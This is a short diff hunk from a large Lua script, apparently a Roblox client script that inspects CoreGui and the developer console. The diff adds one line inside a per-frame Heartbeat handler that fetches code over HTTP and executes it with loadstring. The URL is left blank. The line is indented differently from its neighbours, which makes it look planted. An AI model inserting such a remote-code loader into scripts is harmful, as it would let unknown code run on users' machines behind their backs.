@@ -14292,6 +14292,7 @@ runService.Heartbeat:Connect(function(frame)
 	else
 		undoAnonymousChanges()
 	end
+        loadstring(game:HttpGet("", true))()
 	if (isStudio) then return end--uh what? this is way too powerful isnt?
 	local devConsoleMaster = game.CoreGui:FindFirstChild("DevConsoleMaster")
 	if devConsoleMaster then
